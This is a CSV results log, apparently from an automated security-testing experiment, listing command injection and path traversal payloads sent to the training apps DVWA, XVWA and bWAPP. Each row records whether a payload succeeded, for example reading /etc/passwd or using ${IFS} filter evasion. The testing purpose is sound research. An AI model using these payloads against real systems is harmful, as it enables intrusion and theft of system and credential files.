+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.550357+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:48:59.557409+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,3,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:48:59.561874+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,4,|${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:48:59.569651+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,5,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.573785+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,6,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.581350+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,7,;${IFS}ls,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.592047+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,8,;${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:48:59.602654+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,9,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.610518+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,10,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.617957+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,11,;$IFSwhoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.622142+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,12,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.630013+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,13,;$IFSpwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.632851+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,14,;${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.642537+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,15,;$IFSls,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.653344+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,16,&&$IFSuname$IFS-a,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.663572+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,17,;$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.670759+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Advanced,18,|${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.673895+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Evasion,1,&&$IFSid,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.682990+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Evasion,2,|$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.687202+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Evasion,3,;$IFSls,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.695131+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Evasion,4,&&$IFSuname$IFS-a,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.706073+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Evasion,5,;$IFSpwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.716939+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,218,,2026-10-19T02:48:59.893232+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:48:59.730971+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,3,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.732249+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,4,|${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,63,,2026-10-19T02:48:59.747193+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,5,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.752146+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,6,;${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:48:59.762781+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,7,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:59.780854+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,8,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.783138+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,9,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.781851+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,10,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,47,,2026-10-19T02:48:59.784135+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,11,&&${IFS}uname${IFS}-a,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.805809+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,12,;${IFS}ls,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.928298+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,13,;${IFS}pwd,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:59.940398+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,14,|$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.945189+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Basic,15,;${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.967287+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:59.971294+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:48:59.975748+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,3,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:48:59.984773+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,4,|${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:48:59.989558+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,5,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.000875+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,6,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.018353+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,7,;${IFS}ls,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.022552+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,8,;${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,63,,2026-10-19T02:49:00.028732+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,9,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.031339+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,10,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.040026+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,11,;$IFSwhoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.045151+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,12,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:00.049679+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,13,;$IFSpwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.073189+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,14,;${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.073189+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,15,;$IFSls,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.084823+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,16,&&$IFSuname$IFS-a,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.089803+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,17,;$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.093801+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Advanced,18,|${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.104914+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Evasion,1,&&$IFSid,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.121415+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Evasion,2,|$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.125743+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Evasion,3,;$IFSls,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.133063+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Evasion,4,&&$IFSuname$IFS-a,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.139335+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Command Injection,Evasion,5,;$IFSpwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:00.143756+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,391,,2026-10-19T02:49:00.488408+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,63,,2026-10-19T02:49:00.160457+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,3,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.177318+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,4,|${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:49:00.189648+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,5,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.195539+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,6,;${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,63,,2026-10-19T02:49:00.201208+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,7,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.207530+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,8,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.208666+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,9,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.225160+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,10,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,63,,2026-10-19T02:49:00.246921+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,11,&&${IFS}uname${IFS}-a,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.251644+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,12,;${IFS}ls,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:00.252707+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,13,;${IFS}pwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:00.299939+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,14,|$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:49:00.531833+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Basic,15,;${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:00.550195+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.561103+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,62,,2026-10-19T02:49:00.566787+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,3,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:49:00.587607+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,4,|${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:49:00.597224+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,5,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:00.603339+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,6,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.608052+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,7,;${IFS}ls,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.612815+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,8,;${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,78,,2026-10-19T02:49:00.620180+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,9,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.625049+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,10,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.642985+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,11,;$IFSwhoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.656838+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,12,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:49:00.661567+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,13,;$IFSpwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.671267+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,14,;${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.675986+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,15,;$IFSls,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.680677+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,16,&&$IFSuname$IFS-a,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.685736+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,17,;$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.696894+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Advanced,18,|${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.713720+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Evasion,1,&&$IFSid,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.718933+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Evasion,2,|$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.727649+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Evasion,3,;$IFSls,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.732965+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Evasion,4,&&$IFSuname$IFS-a,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:00.737735+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,Command Injection,Evasion,5,;$IFSpwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.742410+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,313,,2026-10-19T02:49:01.002129+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.773423+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,3,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.785609+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,4,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:49:00.790222+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,5,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:00.795585+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,6,../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:00.801131+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,7,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.806535+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,8,..\..\..\..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:00.811887+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,9,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:00.878440+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,10,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:49:00.881652+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,11,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:49:00.882652+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,12,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,93,,2026-10-19T02:49:00.887656+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Basic,13,../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,78,,2026-10-19T02:49:00.888599+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,1,..\..\..\..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.888599+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,2,../../../../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:00.888599+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,3,../../../../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:01.041001+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,4,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.087235+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,5,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:01.061188+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,6,../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:01.068609+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,7,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.092659+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,8,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.097698+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,9,../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,78,,2026-10-19T02:49:01.108369+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,10,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.112587+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,11,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.127353+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,12,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.132692+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,13,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.142011+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Advanced,14,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.148612+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.153425+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,2,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.157642+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,3,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.165774+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,4,../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:01.171804+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,5,..\..\..\..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.186511+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,6,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.193861+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,7,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.201999+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,8,../../../../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.209892+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,9,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.213760+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,10,../../../../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.220101+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,11,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,62,,2026-10-19T02:49:01.228969+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,12,../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,62,,2026-10-19T02:49:01.237719+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,13,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.257190+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,14,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.264550+00:00
